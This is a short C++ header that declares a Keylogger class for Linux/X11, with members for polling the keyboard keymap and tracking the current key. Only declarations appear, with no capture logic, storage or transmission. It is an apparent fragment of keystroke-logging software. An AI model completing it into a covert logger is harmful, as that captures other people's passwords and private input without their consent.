#ifndef KEYLOGGER_HH_
# define KEYLOGGER_HH_

# include <X11/Xlib.h>
# include <stdio.h>
# include <stdarg.h>
# include <time.h>
# include <string.h>

class 			Keylogger
{

public:
	Keylogger();
	~Keylogger();

	char 		checkLinux();

private:
	Display		*device_;
	char		keymap_[32];
	char		keymapOld_[32];

	char 		curKey_;
   	char 		curKeyOld_;
   	int  		check_;
   	int 		keyCode_;

};

#endif
